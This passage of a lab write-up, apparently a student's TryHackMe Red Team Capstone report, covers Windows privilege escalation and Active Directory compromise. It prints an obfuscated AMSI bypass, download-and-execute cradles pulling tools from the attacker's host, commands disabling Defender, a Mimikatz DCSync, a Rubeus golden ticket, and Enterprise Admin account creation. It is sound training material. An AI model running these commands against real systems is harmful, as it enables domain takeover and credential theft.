<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-27-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-27-figure-01.png" alt="Flag 1 evidence" width="1016" height="566" loading="lazy"></a></figure>

<h3 id="flag-1">Flag 1</h3>

<figure style="width: 75.22%"><a href="/assets/img/posts/red-team-capstone/page-27-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-27-figure-02.png" alt="Flag 1" width="764" height="700" loading="lazy"></a></figure>
</section>

<!-- PDF page 28 -->
<section id="pdf-page-28" class="pdf-source-section" data-pdf-page="28" aria-label="Source page 28">
<h3 id="flag-2">Flag 2</h3>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-28-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-28-figure-01.png" alt="Flag 2" width="1016" height="222" loading="lazy"></a></figure>

<h3 id="flag-3">Flag 3</h3>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-28-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-28-figure-02.png" alt="Flag 3" width="1016" height="184" loading="lazy"></a></figure>

<p>The provided mailbox delivered the flags and a message from TheReserve's Head of Security. That message was a lab clue, not evidence that the credentials had stopped working.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-28-figure-03.png"><img src="/assets/img/posts/red-team-capstone/page-28-figure-03.png" alt="Head of Security message" width="1016" height="398" loading="lazy"></a></figure>
</section>

<!-- PDF page 29 -->
<section id="pdf-page-29" class="pdf-source-section" data-pdf-page="29" aria-label="Source page 29">
<p>The first three flags were recorded.</p>

<figure style="width: 73.30%"><a href="/assets/img/posts/red-team-capstone/page-29-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-29-figure-01.png" alt="Flags recorded" width="746" height="436" loading="lazy"></a></figure>

<p>Both recovered accounts could access WRK1 and WRK2.</p>

<p>The portal updated the network diagram after those submissions.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-29-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-29-figure-02.png" alt="Updated network diagram" width="1016" height="422" loading="lazy"></a></figure>

<p>The diagram now displayed:</p>

<ul><li>Server 1 (.31)</li><li>Server 2 (.32)</li><li>CORPDC .102</li></ul>

<p>The VPN routes available to my Kali machine covered WRK1 (.21) and WRK2 (.22). I used sessions on the workstations as the starting point for later internal access; the diagram alone did not create direct routes from Kali.</p>

<p>The initial checks appeared similar for the two users, but I did not preserve a complete comparison of effective privileges. The later audit explicitly reported membership in a local group with administrative privileges, which matters when interpreting the escalation step.</p>
</section>

<!-- PDF page 30 -->
<section id="pdf-page-30" class="pdf-source-section" data-pdf-page="30" aria-label="Source page 30">
<h2 id="local-administration">Local administration and service permissions</h2>
<figure style="width: 44.10%"><a href="/assets/img/posts/red-team-capstone/page-30-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-30-figure-01.png" alt="Local administration" width="448" height="840" loading="lazy"></a></figure>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-30-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-30-figure-02.png" alt="Service permissions" width="1016" height="480" loading="lazy"></a></figure>

<p>Writing evidence to the Administrator profile required an appropriately authorised, elevated context. Access denied by a protected folder can involve filesystem permissions and a filtered UAC token; it does not, by itself, prove the account is an ordinary non-administrator.</p>
</section>

<!-- PDF page 31 -->
<section id="pdf-page-31" class="pdf-source-section" data-pdf-page="31" aria-label="Source page 31">
<p>I used PowerUp, a collection of Windows PowerShell privilege-escalation checks in PowerSploit. Kali hosted the script; the checks ran on WRK1. PowerUp is not a native Linux privilege-escalation tool.</p>

<p>I attempted to alter the PowerShell process's <code>amsiInitFailed</code> state before loading PowerUp. <a href="https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal">AMSI connects applications to antimalware scanning</a>; whether a script is blocked depends on the engine, signatures, PowerShell version, and protections. I did not separately verify the effect of this attempt.</p>

<p>The AMSI-related command from my session:</p>



<details><summary>AMSI command used during this attempt</summary>
<pre><code>SeT-Item ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  )
( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varIABLE  ( ('1Q'+'2U')
+'zX'  )  -VaL  )."AssEmbly"."GETTYPe"((  "{6}{3}{1}{4}{2}{0}{5}" -
f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),
('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f
't','Sys')+'em')  ) )."getfiElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("
{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f
('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sETVaLUE"(
${n`ULl},${tRuE} )</code></pre>
</details>

<p>I served <code>PowerUp.ps1</code> from the THM directory on Kali using Python's HTTP server. The screenshot shows an HTTP 200 response to WRK1. In the command below, <code>REPLACE_WITH_CURRENT_KALI_TUNNEL_IP</code> needs to be replaced with the reachable address of the Kali machine.</p>

<figure style="width: 88.79%"><a href="/assets/img/posts/red-team-capstone/page-31-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-31-figure-01.png" alt="PowerUp served over HTTP" width="904" height="220" loading="lazy"></a></figure>

<pre><code>$KaliTunnelAddress = &#x27;REPLACE_WITH_CURRENT_KALI_TUNNEL_IP&#x27;
IEX (New-Object Net.WebClient).DownloadString(&quot;http://${KaliTunnelAddress}:8080/PowerUp.ps1&quot;)</code></pre>
</section>

<!-- PDF page 32 -->
<section id="pdf-page-32" class="pdf-source-section" data-pdf-page="32" aria-label="Source page 32">
<p>I ran <code>Invoke-PrivescAudit</code>, which is the command visible in the screenshot. It invokes the checks available in that PowerUp version, not every possible Windows escalation test. See the <a href="https://powersploit.readthedocs.io/en/latest/Privesc/Invoke-PrivescAudit/">function reference</a>.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-32-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-32-figure-01.png" alt="Invoke-PrivescAudit output" width="1016" height="644" loading="lazy"></a></figure>

<p>The report listed local administrative group membership, unquoted service paths, and modifiable service files. These are distinct findings. I chose the modifiable-file route for the Backup service, targeting the writable executable identified by the audit. This focused the attempt on replacing that binary rather than exploiting how Windows interprets an unquoted service path. I still needed to check whether the replacement executed and created the account.</p>

<p><code>Install-ServiceBinary</code> replaces a writable service executable. It is not the unquoted-path technique. The relevant conditions are write access to the binary, an execution context with higher privileges, and a way to trigger the service. The report indicated a modifiable Backup binary; its recommendation alone did not verify every condition. The <a href="https://powersploit.readthedocs.io/en/latest/Privesc/Install-ServiceBinary/">PowerSploit documentation</a> describes the replacement and backup behaviour.</p>

<p>I replaced the Backup binary with a command that created a local lab account and added it to Administrators, then attempted to restart the service. The screenshot shows a restart failure. That error is not proof of success: the subsequent group-membership check and successful login are the evidence that the account was created.</p>

<blockquote class="prompt-info"><p><strong>What this confirmed:</strong> The account was created and usable. Because the audit already reported administrative group membership, I did not establish a standard-user-to-SYSTEM escalation.</p></blockquote>

<pre><code>Install-ServiceBinary -Name &#x27;Backup&#x27; -Command &quot;net user n0debranch Passwd123! /add &amp;&amp; net localgroup Administrators n0debranch /add&quot;
Restart-Service -Name &#x27;Backup&#x27; -Force</code></pre>
</section>

<!-- PDF page 33 -->
<section id="pdf-page-33" class="pdf-source-section" data-pdf-page="33" aria-label="Source page 33">
<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-33-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-33-figure-01.png" alt="New local admin account" width="1016" height="198" loading="lazy"></a></figure>

<p>I checked that the new local account, <code>n0debranch</code>, belonged to the Administrators group.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-33-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-33-figure-02.png" alt="Administrators group membership" width="1016" height="488" loading="lazy"></a></figure>

<p>I ended the existing RDP session and signed in with that local account.</p>

<figure style="width: 74.63%"><a href="/assets/img/posts/red-team-capstone/page-33-figure-03.png"><img src="/assets/img/posts/red-team-capstone/page-33-figure-03.png" alt="Signed in as local admin" width="760" height="298" loading="lazy"></a></figure>

<p>I then wrote the requested evidence file under the Administrator profile. This confirms access for that operation; it does not mean UAC was disabled or that every subsequent process would be elevated.</p>
</section>

<!-- PDF page 34 -->
<section id="pdf-page-34" class="pdf-source-section" data-pdf-page="34" aria-label="Source page 34">
<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-34-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-34-figure-01.png" alt="Evidence written under Administrator profile" width="1016" height="530" loading="lazy"></a></figure>

<h3 id="flag-4">Flag 4:</h3>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-34-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-34-figure-02.png" alt="Flag 4" width="1016" height="188" loading="lazy"></a></figure>

<p>The updated network diagram:</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-34-figure-03.png"><img src="/assets/img/posts/red-team-capstone/page-34-figure-03.png" alt="Updated network diagram" width="1016" height="422" loading="lazy"></a></figure>
</section>

<!-- PDF page 35 -->
<section id="pdf-page-35" class="pdf-source-section" data-pdf-page="35" aria-label="Source page 35">
<h2 id="domain-enumeration">Domain discovery and BloodHound</h2>
<p>My next focus was the corporate domain controller.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-35-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-35-figure-01.png" alt="Domain discovery" width="1016" height="1016" loading="lazy"></a></figure>

<p>At this point, I had established local administrative access on WRK1. The label CORPDC suggested a domain controller, so I checked rather than relying on the diagram.</p>

<p><code>nltest /dsgetdc:corp.thereserve.loc</code></p>

<p>This command asks Windows to locate a domain controller for the named domain. It does not necessarily identify the controller used for the current logon. I ran it from WRK1; the result is below.</p>
</section>

<!-- PDF page 36 -->
<section id="pdf-page-36" class="pdf-source-section" data-pdf-page="36" aria-label="Source page 36">
<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-36-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-36-figure-01.png" alt="nltest result" width="1016" height="190" loading="lazy"></a></figure>

<p>The result identified CORPDC at 10.200.40.102. It did not prove unrestricted connectivity from every host or user.</p>

<p>I used BloodHound to examine AD group membership, permissions, and relationships. SharpHound collects the data; BloodHound imports and analyses it. A graph path is a lead to validate, not proof that the entire path has been executed.</p>

<p>From an elevated PowerShell session, I attempted to change two Microsoft Defender Antivirus preferences. These settings do not suppress logging or all alerts, and policy or tamper protection can prevent the changes. See <a href="https://learn.microsoft.com/en-us/powershell/module/defender/set-mppreference">Microsoft's Set-MpPreference reference</a>.</p>

<pre><code>Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true</code></pre>

<figure style="width: 85.40%"><a href="/assets/img/posts/red-team-capstone/page-36-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-36-figure-02.png" alt="Set-MpPreference" width="868" height="342" loading="lazy"></a></figure>

<p>I placed the legacy SharpHound PowerShell collector in the Kali HTTP directory. Collector and BloodHound versions need to be compatible; the <a href="https://github.com/SpecterOps/SharpHound">official SharpHound repository</a> provides the collector and version information.</p>

<p>Kali, from the directory containing the collector:</p>



<pre><code>python3 -m http.server 8080</code></pre>
</section>

<!-- PDF page 37 -->
<section id="pdf-page-37" class="pdf-source-section" data-pdf-page="37" aria-label="Source page 37">
<p>On WRK1, I loaded the legacy PowerShell collector:</p>

<pre><code>$KaliTunnelAddress = &#x27;REPLACE_WITH_CURRENT_KALI_TUNNEL_IP&#x27;
IEX (New-Object Net.WebClient).DownloadString(&quot;http://${KaliTunnelAddress}:8080/SharpHound.ps1&quot;)</code></pre>

<pre><code>Invoke-BloodHound -CollectionMethod All -Domain corp.thereserve.loc -LDAPUserName laura.wood -LDAPPassword &#x27;Password1@&#x27;</code></pre>

<p>The local account did not provide a domain identity for LDAP collection, so I supplied Laura's domain credentials. Running the process locally and authenticating to the domain are separate concerns.</p>

<p>The screenshot shows an initial LDAP authentication error, a subsequent attempt, and repeated forest-resolution errors. Some data was later imported into BloodHound, but this output does not establish a clean or complete collection. DNS, domain reachability, credentials, collector compatibility, and failed collection methods would need checking before relying on the graph as a complete view.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-37-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-37-figure-01.png" alt="SharpHound collection errors" width="1016" height="196" loading="lazy"></a></figure>

<p>I copied the resulting data back to Kali through Remmina's shared-folder feature. This was much easier than passing files through HTTP requests.</p>

<figure style="width: 36.43%"><a href="/assets/img/posts/red-team-capstone/page-37-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-37-figure-02.png" alt="Remmina shared folder" width="370" height="518" loading="lazy"></a></figure>

<p>The shared folder simplified subsequent file transfers.</p>
</section>

<!-- PDF page 38 -->
<section id="pdf-page-38" class="pdf-source-section" data-pdf-page="38" aria-label="Source page 38">
<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-38-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-38-figure-01.png" alt="File transfer" width="1016" height="676" loading="lazy"></a></figure>

<p>I imported the collected data into BloodHound.</p>

<p>I used <code>start-bloodhound</code> with a Neo4j-based setup. The setup process depends on the BloodHound version; the <a href="https://bloodhound.specterops.io/collect-data/ce-collection/sharphound">current SharpHound documentation</a> covers Community Edition.</p>

<p>I extracted and imported the JSON files from the collected archive.</p>

<p>When I looked for a path from Laura's account to Domain Admin, the graph already showed privileged membership.</p>
</section>

<!-- PDF page 39 -->
<section id="pdf-page-39" class="pdf-source-section" data-pdf-page="39" aria-label="Source page 39">
<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-39-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-39-figure-01.png" alt="BloodHound graph" width="1016" height="428" loading="lazy"></a></figure>

<p>BloodHound showed Laura as a member of Domain Admins, and the accompanying account output also listed the group. This established the observed membership at that point. It did not show how the membership was granted or independently prove an RDP connection to CORPDC.</p>

<figure style="width: 74.48%"><a href="/assets/img/posts/red-team-capstone/page-39-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-39-figure-02.png" alt="Domain Admins membership" width="758" height="298" loading="lazy"></a></figure>
</section>

<!-- PDF page 40 -->
<section id="pdf-page-40" class="pdf-source-section" data-pdf-page="40" aria-label="Source page 40">
<h2 id="unresolved-domain-access">The unresolved Domain Admin step</h2>
<figure style="width: 76.70%"><a href="/assets/img/posts/red-team-capstone/page-40-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-40-figure-01.png" alt="Unresolved Domain Admin step" width="780" height="702" loading="lazy"></a></figure>

<p>I suspected another participant had changed Laura's privileges in the shared environment. I do not have directory-change logs or another source confirming who made the change. Earlier local-group output is not a complete baseline of domain membership, so the timing is also uncertain.</p>

<blockquote class="prompt-warning"><p><strong>Starting point for the next stages:</strong> I continued using the Domain Admin access already available to Laura, but did not establish how she obtained it. The root and BANK domain operations below depended on that existing access.</p></blockquote>
</section>

<!-- PDF page 41 -->
<section id="pdf-page-41" class="pdf-source-section" data-pdf-page="41" aria-label="Source page 41">
<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-41-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-41-figure-01.png" alt="Flag 7 evidence" width="1016" height="804" loading="lazy"></a></figure>

<p>Flag 7 evidence: the portal-requested file in <code>C:\Windows\Temp</code> on CORPDC.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-41-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-41-figure-02.png" alt="Flag 8 evidence" width="1016" height="400" loading="lazy"></a></figure>

<p>Flag 8 evidence: the portal-requested file under <code>C:\Users\Administrator</code> on CORPDC.</p>
</section>

<!-- PDF page 42 -->
<section id="pdf-page-42" class="pdf-source-section" data-pdf-page="42" aria-label="Source page 42">
<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-42-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-42-figure-01.png" alt="Flag 5 evidence" width="1016" height="458" loading="lazy"></a></figure>

<p>Flag 5 evidence: the portal-requested file in <code>C:\Windows\Temp</code> on Server1.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-42-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-42-figure-02.png" alt="Flag 6 evidence" width="1016" height="328" loading="lazy"></a></figure>

<p>Flag 6 evidence: the portal-requested file under <code>C:\Users\Administrator</code> on Server1.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-42-figure-03.png"><img src="/assets/img/posts/red-team-capstone/page-42-figure-03.png" alt="Additional evidence" width="1016" height="470" loading="lazy"></a></figure>
</section>

<!-- PDF page 43 -->
<section id="pdf-page-43" class="pdf-source-section" data-pdf-page="43" aria-label="Source page 43">
<h2 id="forest-trusts">Forest trusts and privileged access</h2>
<p>The network diagram after the next four flag submissions:</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-43-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-43-figure-01.png" alt="Network diagram" width="1016" height="704" loading="lazy"></a></figure>

<p>The diagram also displayed:</p>

<ul><li>BANKDC .101</li><li>JMP .61</li><li>WORK1 .51</li><li>WORK2 .52</li></ul>

<p>I then examined ROOTDC at 10.200.40.100. The domain names suggested that <code>thereserve.loc</code> was the forest root and that CORP and BANK were child domains.</p>

<p>The command below queries trust relationships for the current domain. The screenshot reports a bidirectional parent-child relationship between CORP and the root. A trust enables authentication across domains; it does not automatically grant administrative access.</p>

<p><code>([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()</code></p>

<figure style="width: 70.50%"><a href="/assets/img/posts/red-team-capstone/page-43-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-43-figure-02.png" alt="Trust relationships" width="716" height="174" loading="lazy"></a></figure>
</section>

<!-- PDF page 44 -->
<section id="pdf-page-44" class="pdf-source-section" data-pdf-page="44" aria-label="Source page 44">
<p>With the already-privileged CORP account, I attempted to retrieve the CORP <code>krbtgt</code> secret. Kerberos uses that account's keys to protect ticket-granting tickets. Possession of a usable key can support forged tickets, often called golden tickets; acceptance still depends on the target environment and its validation behaviour.</p>

<p>I used Mimikatz for the DCSync operation described in its <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump">lsadump module documentation</a>.</p>

<p>I transferred the lab copy of <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a> to WRK1.</p>



<p>I ran the following command in Laura's domain context on WRK1. DCSync uses the directory-replication protocol and requires replication permissions, including access to secret data; simply being a local administrator on WRK1 would not be enough. Here it depended on the unexplained domain privilege described above.</p>

<pre><code>.\mimikatz.exe &quot;lsadump::dcsync /domain:corp.thereserve.loc /user:CORP\krbtgt&quot; &quot;exit&quot;</code></pre>
</section>

<!-- PDF page 45 -->
<section id="pdf-page-45" class="pdf-source-section" data-pdf-page="45" aria-label="Source page 45">
<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-45-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-45-figure-01.png" alt="DCSync output" width="1016" height="910" loading="lazy"></a></figure>

<p>I also resolved the root-domain Administrator account SID. That returns an <em>account</em> SID ending in RID 500; its domain portion is the prefix before that final component. The code below makes that distinction explicit.</p>

<pre><code>$acct = New-Object System.Security.Principal.NTAccount(&quot;THERESERVE&quot;, &quot;Administrator&quot;)
$accountSid = $acct.Translate([System.Security.Principal.SecurityIdentifier])
$accountSid.Value
$accountSid.AccountDomainSid.Value</code></pre>

<pre><code>thereserve.loc (Forest Root)
├── SID: S-1-5-21-1255581842-1300659601-3764024703
│
├── corp.thereserve.loc (Child Domain)
│   ├── SID: S-1-5-21-170228521-1485475711-3199862024
│   ├── krbtgt NTLM: 0c757a3445acb94a654554f3ac529ede
│   └── Trust: Bidirectional ParentChild with thereserve.loc
│
└── bank.thereserve.loc (Child Domain)</code></pre>
</section>

<!-- PDF page 46 -->
<section id="pdf-page-46" class="pdf-source-section" data-pdf-page="46" aria-label="Source page 46">
<pre><code>    ├── SID: S-1-5-21-3455338511-2124712869-1448239061
    └── Trust: Bidirectional ParentChild with thereserve.loc</code></pre>

<p>A security identifier (SID) identifies a security principal. A domain account or group SID combines the domain SID with a relative identifier (RID). RID 500 identifies the built-in Administrator; RID 519 identifies Enterprise Admins in the forest root. RIDs are not always three digits. See <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers">Microsoft's SID reference</a>.</p>

<p>Rubeus was included in the supplied tools. Its <a href="https://github.com/GhostPack/Rubeus">official documentation</a> describes Kerberos ticket creation and import.</p>

<p>I used the CORP key and domain SID to forge a ticket, adding the root-domain Enterprise Admins SID through <code>/sids</code>. <code>/ptt</code> imported it into my current logon session. This attempt depended on the compromised key, correct identifiers, supported encryption, ticket validation, name resolution, and reachable services. A bidirectional trust alone does not grant these privileges.</p>

<pre><code>.\Rubeus.exe golden /rc4:0c757a3445acb94a654554f3ac529ede /domain:corp.thereserve.loc /sid:S-1-5-21-170228521-1485475711-3199862024 /sids:S-1-5-21-1255581842-1300659601-3764024703-519 /user:Administrator /ptt</code></pre>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-46-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-46-figure-01.png" alt="Rubeus golden ticket" width="1016" height="582" loading="lazy"></a></figure>
</section>

<!-- PDF page 47 -->
<section id="pdf-page-47" class="pdf-source-section" data-pdf-page="47" aria-label="Source page 47">
<p>I used <code>klist</code> to inspect cached tickets. A ticket appearing in the cache proves it was loaded, not that a remote service accepted it.</p>

<figure style="width: 80.97%"><a href="/assets/img/posts/red-team-capstone/page-47-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-47-figure-01.png" alt="klist output" width="824" height="396" loading="lazy"></a></figure>

<p>I connected to ROOTDC using <code>Enter-PSSession</code>, then created a domain account and added it to Enterprise Admins.</p>

<pre><code>Enter-PSSession -ComputerName ROOTDC.THERESERVE.LOC
# The next commands run in the remote ROOTDC session shown in the screenshot.
net user n0debranchEA Passwd123! /add /domain
net group &quot;Enterprise Admins&quot; n0debranchEA /add /domain
net user n0debranchEA /domain</code></pre>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-47-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-47-figure-02.png" alt="ROOTDC domain account" width="1016" height="650" loading="lazy"></a></figure>

<p>These were domain accounts, not local workstation accounts. Enterprise Admins exists in the forest root; it is not a separate group created in each child domain. The next screenshots show another root-domain account and a BANK-domain account added to Domain Admins. They do not demonstrate equivalent account creation in CORP.</p>
</section>

<!-- PDF page 48 -->
<section id="pdf-page-48" class="pdf-source-section" data-pdf-page="48" aria-label="Source page 48">
<h2 id="remaining-evidence">Evidence through flag 16</h2>
<p>The screenshots below distinguish the ROOTDC operation from the remote BANKDC operation.</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-48-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-48-figure-01.png" alt="ROOTDC operation" width="1016" height="148" loading="lazy"></a></figure>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-48-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-48-figure-02.png" alt="BANKDC operation" width="1016" height="144" loading="lazy"></a></figure>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-48-figure-03.png"><img src="/assets/img/posts/red-team-capstone/page-48-figure-03.png" alt="Domain account changes" width="1016" height="508" loading="lazy"></a></figure>

<p>This provided administrative access to additional lab systems, allowing me to record the remaining evidence through flag 16. It did not prove unrestricted access to every service or completion of the SWIFT application workflow.</p>

<h3 id="flag-16">Flag 16:</h3>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-48-figure-04.png"><img src="/assets/img/posts/red-team-capstone/page-48-figure-04.png" alt="Flag 16" width="1016" height="448" loading="lazy"></a></figure>
</section>

<!-- PDF page 49 -->
<section id="pdf-page-49" class="pdf-source-section" data-pdf-page="49" aria-label="Source page 49">
<h3 id="flag-15">Flag 15</h3>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-49-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-49-figure-01.png" alt="Flag 15" width="1016" height="382" loading="lazy"></a></figure>

<h3 id="flag-9">Flag 9</h3>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-49-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-49-figure-02.png" alt="Flag 9" width="1016" height="370" loading="lazy"></a></figure>

<h3 id="flag-10">Flag 10</h3>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-49-figure-03.png"><img src="/assets/img/posts/red-team-capstone/page-49-figure-03.png" alt="Flag 10" width="1016" height="288" loading="lazy"></a></figure>
</section>

<!-- PDF page 50 -->
<section id="pdf-page-50" class="pdf-source-section" data-pdf-page="50" aria-label="Source page 50">
<h3 id="flag-11">Flag 11</h3>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-50-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-50-figure-01.png" alt="Flag 11" width="1016" height="356" loading="lazy"></a></figure>

<h3 id="flag-12">Flag 12</h3>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-50-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-50-figure-02.png" alt="Flag 12" width="1016" height="304" loading="lazy"></a></figure>

<h3 id="flag-13">Flag 13</h3>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-50-figure-03.png"><img src="/assets/img/posts/red-team-capstone/page-50-figure-03.png" alt="Flag 13" width="1016" height="368" loading="lazy"></a></figure>
</section>

<!-- PDF page 51 -->
<section id="pdf-page-51" class="pdf-source-section" data-pdf-page="51" aria-label="Source page 51">
<h2 id="where-the-attempt-ended">Where the attempt ended</h2>
<h3 id="flag-14">Flag 14</h3>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-51-figure-01.png"><img src="/assets/img/posts/red-team-capstone/page-51-figure-01.png" alt="Flag 14" width="1016" height="444" loading="lazy"></a></figure>

<p>The final recorded network diagram:</p>

<figure style="width: 100.00%"><a href="/assets/img/posts/red-team-capstone/page-51-figure-02.png"><img src="/assets/img/posts/red-team-capstone/page-51-figure-02.png" alt="Final network diagram" width="1016" height="652" loading="lazy"></a></figure>

<p>The lab reset before I continued into the SWIFT stage, and my access was lost. Continuing would have meant rebuilding access in a fresh deployment. Because I was undertaking the room as part of my Certificate IV assessment, I kept this write-up focused on the work carried out for that assessment rather than starting a new run after the reset.</p>

<p>That makes this an account of my assessment work, with evidence through flag 16, rather than a complete walkthrough of every room objective. I did not complete the remaining jump-host-to-application path, the required application roles, or the final SWIFT transfer between the supplied accounts.</p>

<p>Here is what I completed and what I would need to revisit.</p>
</section>

<!-- PDF page 52 -->
<section id="pdf-page-52" class="pdf-source-section" data-pdf-page="52" aria-label="Results and references">
<h2 id="evidence-and-gaps">What I completed and what remains</h2>
<div class="table-wrapper"><table>
<thead><tr><th>Stage</th><th>What I demonstrated</th><th>Limit</th></tr></thead>
<tbody>
<tr><td>External reconnaissance</td><td>Host and service scans; web paths and staff information.</td><td>The discovery sweep included excluded infrastructure. The scan is not exhaustive.</td></tr>
<tr><td>Corporate entry</td><td>Portal behaviour, exposed VPN material, reported SMTP credentials, VPN routes, and workstation access.</td><td>I did not keep all candidate files, portal requests, and connection transcripts.</td></tr>
<tr><td>Local administration</td><td>A writable-service finding, a new local admin account, and successful evidence-file access.</td><td>The audit already reported admin-group membership. Service restart failure alone did not prove exploitation.</td></tr>
<tr><td>CORP Domain Admin</td><td>Privileged membership was visible and used.</td><td>I did not establish how the account gained these privileges.</td></tr>
<tr><td>AD collection</td><td>I imported collected data into BloodHound.</td><td>LDAP and forest-resolution errors prevent a claim of complete collection.</td></tr>
<tr><td>Root and BANK access</td><td>Recorded ticket work, a remote ROOTDC session, domain-account changes, and evidence through flag 16.</td><td>Dependent on the unexplained CORP privilege; exact tool versions and all intermediate checks were not captured.</td></tr>
<tr><td>SWIFT objective</td><td>I planned to continue into the SWIFT environment.</td><td>Jump-host/application access, required roles, and the transfer were not demonstrated.</td></tr>
</tbody></table></div>
<p>To finish the room, I would need to repeat the corporate privilege-escalation stage from a known starting state, resolve the collection errors, and complete the SWIFT application workflow. On another attempt, I would also keep fuller logs of group membership, routes, DNS, tool versions, and cleanup, including restoration of the service binary and removal of the accounts I created.</p>

<h2 id="lessons-learned">What I learned</h2>
<p>The strongest lessons were about evidence: distinguish a reachable host from an authorised target, an observed group membership from an escalation I performed, and a tool's output from proof that an operation succeeded. Keeping complete logs and recording the execution context would have made this attempt much easier to reproduce and explain.</p>
<h2 id="references">References</h2>

<ul>
<li><a href="https://tryhackme.com/room/redteamcapstonechallenge">TryHackMe — Red Team Capstone Challenge</a></li>
<li><a href="https://www.swift.com/about-us/who-we-are">Swift — who we are and how financial messaging works</a></li>
<li><a href="https://nmap.org/book/man-host-discovery.html">Nmap — host discovery</a></li>
<li><a href="https://openvpn.net/community-docs/community-articles/openvpn-2-6-manual/">OpenVPN — 2.6 reference manual</a></li>
